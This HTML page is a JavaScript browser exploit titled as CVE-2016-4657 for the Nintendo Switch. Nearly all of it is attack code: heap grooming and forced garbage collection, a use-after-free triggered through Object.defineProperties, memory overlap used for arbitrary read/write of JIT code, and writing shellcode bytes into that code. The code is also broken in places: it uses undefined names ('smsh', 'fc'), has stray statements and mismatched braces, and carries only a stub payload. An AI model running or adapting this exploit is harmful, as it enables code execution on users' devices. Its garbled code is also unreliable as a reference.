<!doctype html>
<html>

    <head>
        <title>CVE-2016-4657 for Nintendo Switch</title>
    </head>

    <body>
        <script>
            var pressure = new Array(100);
            triggerGC = function() {
                for (var i = 0; i < pressure.length; i++) {
                    pressure[i] = new Uint32Array(0x10000);
                }
                for (var i = 0; i < pressure.length; i++) {
                    pressure[i] = 0;
                }
            }

            function forceGC(pressure) {
                while (pressure > 0) {
                    triggerGC();
                    pressure--;
                }
            }

            // buffer to be overlapped with arr later on
            var bufs = new Array(0x1000);
            // This will be our raw r/w/x bytes later on after attaching it to our overlayed arr
            var smash = new Uint32Array(0x10);
            var stale = 0;
            var _dview = null;

            // taken from JBME Code. Thanks to qwertyoruiop for his amazing work
            function u2d(low, hi) {
                // Only allocate memory once, so we dont mess with the gc
                if (!_dview) _dview = new DataView(new ArrayBuffer(16));
                _dview.setUint32(0, hi);
                _dview.setUint32(4, low);
                return _dview.getFloat64(0);
            }

            function exploit() {

                if (smash.length != 0x10) {
                    document.getElementById('output')
                        .innerHTML += 'Exploit allready ran with success';
                    return;
                }

                triggerGC();

                // gc target
                var arr = new Array(0x100);
                var uselessArray = new ArrayBuffer(0x1000);

                // force memory allocation by filling the array
                arr[0] = uselessArray;
                // deadbeef
                arr[1] = 0x13371337;

                // overwrite not_number.toString() for use with props later on
                var not_number = {};
                not_number.toString = function() {

                    // should not be set until we already had an overlapp
                    if (bufs[0]) {
                        document.getElementById('output')
                            .innerHTML += 'Exploit allready ran with success</br>';
                        return 10;
                    }

                    // remove references to our target so it gets GC'ed
                    arr = null;
                    props["stale"]["value"] = null;

                    // GC arr
                    forceGC(20);

                    // hopefully overallocat our target array
                    for (i = 0; i < bufs.length; i++) {
                        bufs[i] = new Uint32Array(0x200)
                        for (k = 0; k < bufs[i].length;) {
                            // fill array with Integer value and idenentifier
                            bufs[i][k++] = 0xCAFEBABE;
                            bufs[i][k++] = 0xFFFF0000;
                        }
                    }
                    return 10;
                };

                document.getElementById('output')
                    .innerHTML += 'Creating props</br>';
                var props = {
                    p0: {
                        value: 0
                    },
                    p1: {
                        value: 1
                    },
                    p2: {
                        value: 2
                    },
                    p3: {
                        value: 3
                    },
                    p4: {
                        value: 4
                    },
                    p5: {
                        value: 5
                    },
                    p6: {
                        value: 6
                    },
                    p7: {
                        value: 7
                    },
                    p8: {
                        value: 8
                    },
                    // will call .toString()
                    length: {
                        value: not_number
                    },
                    // at time of parsing arr is still referenced, but gets freed, when properties are applied
                    stale: {
                        value: arr
                    },
                    after: {
                        value: 420
                    }
                };
                // array for acessing the target array
                var access = [];
                // and apply the properties to it
                Object.defineProperties(access, props);
                // Now we get a new reference to arr, which was cleared, so it is in fact a reference to our overlapped memory (hopefully)
                stale = access.stale;

                // if not an integer (0xFFFF0000) with our set value, we did not overlay at all.
                if (stale[0] == 0xCAFEBABE) {
                    // we add to our first element to be able
                    stale[0] += 0x13AF0431;
                    document.getElementById('output')
                        .innerHTML += 'Searching for the 0xDEADBEEF</br>';
                    // search for the start of the overlay
                    for (i = 0; i < bufs.length; i++) {
                        for (k = 0; k < bufs[0].length; k++) {
                            // is this out collision?
                            if (bufs[i][k] == 0xDEADBEEF) {
                                document.getElementById('output')
                                    .innerHTML += 'Overlay at ' + i + ', ' + k + '</br>';
                            stale[0] = {
                                'a': u2d(105, 0),
                                'b': u2d(0, 0),
                                'c': smash,
                                'd': u2d(0x100, 0)
                            }

                            stale[0][4] = 0;

                            stale[0][5] = 1;
                            stale[0][6] = 0x20;
                            stale[0][4] = bufs[i][k - 2] + 0x18;
                            stale[0][5] = bufs[i][k - 1]; /* read JSFunction */
                            a = smash[0] + 0x18;
                            b = smash[1];
                            stale[0][4] = a;
                            stale[0][5] = b; /* read JITCode */
                            a = smash[0] + 0x10;
                            b = smash[1];
                            stale[0][4] = a;
                            stale[0][5] = b; /* read JIT */
                            a = smash[0];
                            b = smash[1];
                            stale[0][4] = a;
                            stale[0][5] = b; /* set jit as backing for smsh, allowing write into fc's opcodes */
                            shc = new Uint8Array([  0x41, 0xb0, 0x02, 0x49 ])
                            shc32=new Uint32Array(shc.buffer)
                            var x=0;
                            for(n=0; n<shc32.length; n++) smsh[n]=shc32[n]; fc() break;

            alert('done!');
            return;
            }
            }
            }
            }
            document.getElementById('output')
                .innerHTML += 'Expolit ran out without success</br>';
            }


            function start() {
                document.getElementById('output')
                    .innerHTML += 'Starting... </br>';
                document.getElementById('output')
                    .innerHTML += 'Pre Exploit cleaning</br>';
                forceGC(5);
                document.getElementById('output')
                    .innerHTML += 'Executing exploit</br>';
                setTimeout(exploit, 1000);
            }
        </script>
        <a href='javascript:start();'>go</a>
        <a href='javascript:document.location.reload();'>reload</a>
        <div>This code is derived of Code by 'qwertyoruiop' that is licensed under the Anyone But Stefan Esser license.</br>
            Therefore it falls under the same license! </div>
        <div id='output'>Output:</br>
        </div>
    </body>

</html>
